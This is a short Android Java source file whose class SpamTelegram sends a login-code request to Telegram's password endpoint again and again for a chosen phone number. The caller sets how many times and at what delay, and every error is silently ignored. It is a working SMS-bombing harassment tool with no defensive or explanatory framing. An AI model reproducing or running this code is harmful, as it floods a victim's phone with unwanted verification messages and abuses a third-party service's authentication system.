package com.manta.x;

import android.content.Context;
import android.os.AsyncTask;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class SpamTelegram {
    public static void startSpam(Context ctx, String phoneNumber, int delay, int count) {
        new AsyncTask<Void,Void,Void>(){
            @Override
            protected Void doInBackground(Void... voids) {
                for (int i=0; i<count; i++) {
                    try {
                        URL url = new URL("https://my.telegram.org/auth/send_password");
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("POST");
                        conn.setDoOutput(true);
                        String params = "phone=" + URLEncoder.encode(phoneNumber, "UTF-8");
                        OutputStream os = conn.getOutputStream();
                        os.write(params.getBytes());
                        os.flush();
                        conn.getInputStream().close();
                        Thread.sleep(delay);
                    } catch (Exception e) {}
                }
                return null;
            }
        }.execute();
    }
}